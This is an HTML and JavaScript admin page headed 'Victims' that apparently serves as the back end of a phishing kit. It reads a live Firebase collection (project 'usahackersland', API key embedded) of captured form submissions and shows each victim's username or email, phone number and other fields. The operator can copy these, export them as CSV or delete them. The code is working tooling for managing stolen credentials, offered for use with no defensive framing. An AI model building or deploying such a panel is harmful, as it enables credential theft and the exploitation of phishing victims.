<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>üìä Submissions Dashboard</title>
<style>
body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background: #121212;
  color: #e0e0e0;
  margin: 0;
  padding: 20px;
}
.container {
  max-width: 1200px;
  margin: auto;
}
h2 {
  text-align: center;
  margin-bottom: 20px;
  color: #00bcd4;
}

/* Top buttons */
.top-buttons {
  text-align: center;
  margin-bottom: 20px;
  display: flex;
  flex-wrap: wrap;
  justify-content: center;
}
.top-buttons button {
  padding: 8px 14px;
  margin: 5px;
  border: none;
  border-radius: 6px;
  cursor: pointer;
  font-weight: bold;
  transition: transform 0.1s ease;
}
.top-buttons button:hover { transform: scale(1.05); }
.top-buttons .selectAll { background:#1976d2;color:#fff; }
.top-buttons .unselectAll { background:#9e9e9e;color:#fff; }
.top-buttons .copySelected { background:#4caf50;color:#fff; }
.top-buttons .copyAll { background:#00bcd4;color:#fff; }
.top-buttons .deleteAll { background:#d32f2f;color:#fff; }
.top-buttons .importAll { background:#ff9800;color:#fff; }

/* Card styles */
.cards {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
  gap: 20px;
}
.card {
  background: #1e1e1e;
  border-radius: 12px;
  padding: 20px;
  box-shadow: 0 6px 20px rgba(0,0,0,0.5);
  transition: transform 0.2s, box-shadow 0.2s;
}
.card:hover {
  transform: translateY(-5px);
  box-shadow: 0 10px 25px rgba(0,0,0,0.7);
}
.card img.logo {
  max-width: 100%;
  height: 60px;
  object-fit: contain;
  border-radius: 6px;
  margin-bottom: 10px;
  cursor: pointer;
  border: 1px solid #555;
}

/* Card fields */
.field {
  margin-bottom: 8px;
}
.field span {
  font-weight: bold;
  color: #00bcd4;
}

/* Card buttons */
.buttons {
  margin-top: 12px;
}
button.copy { background:#4caf50;color:#fff; }
button.delete { background:#f44336;color:#fff; }

/* Checkbox */
.card input[type=checkbox] {
  margin-right: 8px;
  transform: scale(1.3);
  cursor: pointer;
}
</style>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
</head>
<body>
<div class="container">
<h2>üß® Victims</h2>
<div class="top-buttons">
  <button class="selectAll" onclick="selectAll()">Select All ‚úÖ</button>
  <button class="unselectAll" onclick="unselectAll()">Unselect All ‚ùå</button>
  <button class="copySelected" onclick="copySelected()">Copy Selected üìã</button>
  <button class="copyAll" onclick="copyAll()">Copy All üìù</button>
  <button class="deleteAll" onclick="deleteSelected()">Delete Selected üóëÔ∏è</button>
  <button class="importAll" onclick="importAll()">Import All üì•</button>
</div>
<div class="cards" id="cardsContainer"></div>
</div>

<script>
const $ = id => document.getElementById(id);
const firebaseConfig = {
  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
  authDomain: "usahackersland.firebaseapp.com",
  projectId: "usahackersland"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

let selected = new Set();
let submissionsData = [];

// Render submissions as cards
function renderCards(submissions){
  const container = $("cardsContainer");
  container.innerHTML = "";
  submissionsData = submissions; // store current submissions for copy/import

  submissions.forEach((doc)=>{
    const data = doc.data().data || {};
    const formId = doc.data().formId || "-";
    const createdAt = new Date(doc.data().createdAt).toLocaleString();
    const title = data.title || "-";
    const logoUrl = data.logo || "";
    const username = data.username || data.email || "-";
    const phone = data["Phone Number"] || "-";
    const otherFields = Object.entries(data)
      .filter(([k,_])=>!["username","email","Phone Number","title","logo"].includes(k))
      .map(([k,v])=>`${k}: ${v}`).join(", ");

    const card = document.createElement("div");
    card.className = "card";

    // Checkbox for selection
    const checkbox = document.createElement("input");
    checkbox.type = "checkbox";
    checkbox.dataset.docId = doc.id;
    checkbox.onchange = e=>{
      if(e.target.checked) selected.add(doc.id);
      else selected.delete(doc.id);
    };
    card.appendChild(checkbox);

    // Logo clickable
    if(logoUrl){
      const img = document.createElement("img");
      img.src = logoUrl;
      img.className = "logo";
      img.title = "Click to view full size";
      img.onclick = ()=>window.open(logoUrl,"_blank");
      card.appendChild(img);
    }

    card.innerHTML += `
      <div class="field"><span>Form ID:</span> ${formId}</div>
      <div class="field"><span>Title:</span> ${title}</div>
      <div class="field"><span>Username / Email:</span> ${username}</div>
      <div class="field"><span>Phone:</span> ${phone}</div>
      <div class="field"><span>Other Fields:</span> ${otherFields || '-'}</div>
      <div class="field"><span>Time:</span> ${createdAt}</div>
    `;

    // Actions
    const btnDiv = document.createElement("div");
    btnDiv.className = "buttons";

    const copyBtn = document.createElement("button");
    copyBtn.textContent = "Copy All üìã";
    copyBtn.className = "copy";
    copyBtn.onclick = ()=>{
      let text = `Form ID: ${formId}\nTitle: ${title}\nLogo: ${logoUrl}\nUsername/Email: ${username}\nPhone: ${phone}\nOther Fields: ${otherFields}\nTime: ${createdAt}`;
      navigator.clipboard.writeText(text);
      alert("Submission copied!");
    };

    const deleteBtn = document.createElement("button");
    deleteBtn.textContent = "Delete üóëÔ∏è";
    deleteBtn.className = "delete";
    deleteBtn.onclick = ()=>db.collection("submissions").doc(doc.id).delete();

    btnDiv.appendChild(copyBtn);
    btnDiv.appendChild(deleteBtn);
    card.appendChild(btnDiv);

    container.appendChild(card);
  });
}

// Select all cards
function selectAll(){
  document.querySelectorAll(".cards input[type=checkbox]").forEach(cb=>{
    cb.checked = true;
    selected.add(cb.dataset.docId);
  });
}

// Unselect all cards
function unselectAll(){
  document.querySelectorAll(".cards input[type=checkbox]").forEach(cb=>{
    cb.checked = false;
  });
  selected.clear();
}

// Copy selected cards
function copySelected(){
  if(selected.size === 0){ alert("No submissions selected!"); return; }
  let text = "";
  submissionsData.forEach(doc=>{
    if(selected.has(doc.id)){
      const data = doc.data().data || {};
      const formId = doc.data().formId || "-";
      const createdAt = new Date(doc.data().createdAt).toLocaleString();
      const title = data.title || "-";
      const logoUrl = data.logo || "";
      const username = data.username || data.email || "-";
      const phone = data["Phone Number"] || "-";
      const otherFields = Object.entries(data)
        .filter(([k,_])=>!["username","email","Phone Number","title","logo"].includes(k))
        .map(([k,v])=>`${k}: ${v}`).join(", ");

      text += `Form ID: ${formId}\nTitle: ${title}\nLogo: ${logoUrl}\nUsername/Email: ${username}\nPhone: ${phone}\nOther Fields: ${otherFields}\nTime: ${createdAt}\n\n`;
    }
  });
  navigator.clipboard.writeText(text.trim());
  alert("Selected submissions copied!");
}

// Copy all submissions
function copyAll(){
  if(submissionsData.length === 0){ alert("No submissions available!"); return; }
  let text = "";
  submissionsData.forEach(doc=>{
    const data = doc.data().data || {};
    const formId = doc.data().formId || "-";
    const createdAt = new Date(doc.data().createdAt).toLocaleString();
    const title = data.title || "-";
    const logoUrl = data.logo || "";
    const username = data.username || data.email || "-";
    const phone = data["Phone Number"] || "-";
    const otherFields = Object.entries(data)
      .filter(([k,_])=>!["username","email","Phone Number","title","logo"].includes(k))
      .map(([k,v])=>`${k}: ${v}`).join(", ");

    text += `Form ID: ${formId}\nTitle: ${title}\nLogo: ${logoUrl}\nUsername/Email: ${username}\nPhone: ${phone}\nOther Fields: ${otherFields}\nTime: ${createdAt}\n\n`;
  });
  navigator.clipboard.writeText(text.trim());
  alert("All submissions copied!");
}

// Delete selected cards
function deleteSelected(){
  if(selected.size === 0){ alert("No submissions selected!"); return; }
  selected.forEach(docId=>db.collection("submissions").doc(docId).delete());
  selected.clear();
}

// Import all submissions as CSV
function importAll(){
  if(submissionsData.length === 0){ alert("No submissions available!"); return; }
  let csv = "Form ID,Title,Username/Email,Phone,Other Fields,Time,Logo URL\n";
  submissionsData.forEach(doc=>{
    const data = doc.data().data || {};
    const formId = doc.data().formId || "-";
    const createdAt = new Date(doc.data().createdAt).toLocaleString();
    const title = `"${(data.title||"-").replace(/"/g,'""')}"`;
    const logoUrl = data.logo || "";
    const username = `"${(data.username||data.email||"-").replace(/"/g,'""')}"`;
    const phone = `"${(data["Phone Number"]||"-").replace(/"/g,'""')}"`;
    const otherFields = `"${Object.entries(data)
      .filter(([k,_])=>!["username","email","Phone Number","title","logo"].includes(k))
      .map(([k,v])=>`${k}: ${v}`).join(", ").replace(/"/g,'""')}"`;
    csv += `${formId},${title},${username},${phone},${otherFields},${createdAt},${logoUrl}\n`;
  });
  const blob = new Blob([csv], {type: 'text/csv'});
  const link = document.createElement("a");
  link.href = URL.createObjectURL(blob);
  link.download = "submissions.csv";
  link.click();
}

// Listen live submissions
db.collection("submissions").orderBy("createdAt","desc").onSnapshot(snap=>{
  const submissions = [];
  snap.forEach(doc=>{
    submissions.push(doc);
  });
  renderCards(submissions);
});
</script>
</body>
</html>
